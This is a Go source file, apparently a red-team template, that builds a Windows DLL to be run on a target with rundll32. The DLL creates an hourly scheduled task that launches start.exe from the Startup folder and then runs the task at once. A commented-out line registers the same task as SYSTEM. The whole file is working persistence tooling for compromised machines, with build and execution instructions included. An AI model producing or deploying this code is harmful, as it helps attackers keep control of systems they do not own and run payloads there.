package main

import(
    "C"
    "os/exec"
    "time"
    "fmt"
)

//Compile with
//env GOOS=windows GOARCH=386 CGO_ENABLED=1 CC=i686-w64-mingw32-gcc go build -buildmode=c-shared -o golang_dll_x86.dll TEMPLATE7-schtasknocleanup-dll.go
//On target system execute with
//rundll32.exe golang_dll_x86.dll,EntryPoint


//export EntryPoint
func EntryPoint() {

        fmt.Printf("Time Unix: %v\n", time.Now().Unix())
        time.Sleep(7 * time.Second)
        fmt.Printf("Time now %v\n", time.Now().Unix())

        //c := exec.Command("schtasks", "/create", "/ru", "SYSTEM", "/tn","start", "/tr","c:\\Windows\\System32\\config\\systemprofile\\AppData\\Roaming\\start.exe", "/sc","hourly", "/f")
        c := exec.Command("schtasks", "/create", "/tn","start", "/tr","c:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\start.exe","/sc","hourly", "/f")
        c.Start()

        fmt.Printf("Time Unix: %v\n", time.Now().Unix())
        time.Sleep(5 * time.Second)
        fmt.Printf("Time now %v\n", time.Now().Unix())

        d := exec.Command("schtasks", "/run", "/tn","start","/I")
        d.Start()

}
func main () {}
